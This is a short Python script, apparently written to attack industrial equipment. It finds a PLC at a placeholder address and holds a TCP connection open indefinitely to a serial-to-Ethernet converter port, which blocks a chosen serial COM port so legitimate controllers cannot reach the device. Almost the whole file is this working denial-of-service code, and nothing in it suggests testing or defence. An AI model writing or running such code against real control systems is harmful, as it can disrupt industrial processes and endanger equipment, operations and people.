import socket
import time
import subprocess

# Step 1: Find the PLC's IP address
def find_plc_ip():
    # Use a network scanning tool or a predefined list to find the PLC's IP
    # For simplicity, we assume the IP is known or provided in a configuration file
    # Replace this with actual logic to find the PLC's IP
    plc_ip = "192.168.1.100"  # Example IP, replace with actual PLC IP
    return plc_ip

# Step 2: Block the serial COM port by holding a TCP connection
def block_serial_com(plc_ip, com_port):
    # Serial-to-Ethernet converter port mapping
    com_port_mapping = {
        1: 20001,
        2: 20002,
        3: 20003
    }

    # Check if the provided COM port is valid
    if com_port not in com_port_mapping:
        print(f"Invalid COM port: {com_port}. Valid ports are 1, 2, or 3.")
        return

    # Create a TCP socket and connect to the serial-to-Ethernet converter
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)  # Set a timeout for the connection
        port = com_port_mapping[com_port]
        sock.connect((plc_ip, port))
        print(f"Successfully blocked COM{com_port} by holding a TCP connection to {plc_ip}:{port}.")
        
        # Keep the connection open indefinitely
        while True:
            time.sleep(1)  # Keep the script running to maintain the connection
    except socket.error as e:
        print(f"Failed to block COM{com_port}: {e}")
    finally:
        sock.close()

# Main function
def main():
    # Step 1: Find the PLC's IP address
    plc_ip = find_plc_ip()
    print(f"Found PLC IP: {plc_ip}")

    # Step 2: Block the desired serial COM port (e.g., COM1)
    com_port_to_block = 1  # Change this to the desired COM port (1, 2, or 3)
    block_serial_com(plc_ip, com_port_to_block)

if __name__ == "__main__":
    main()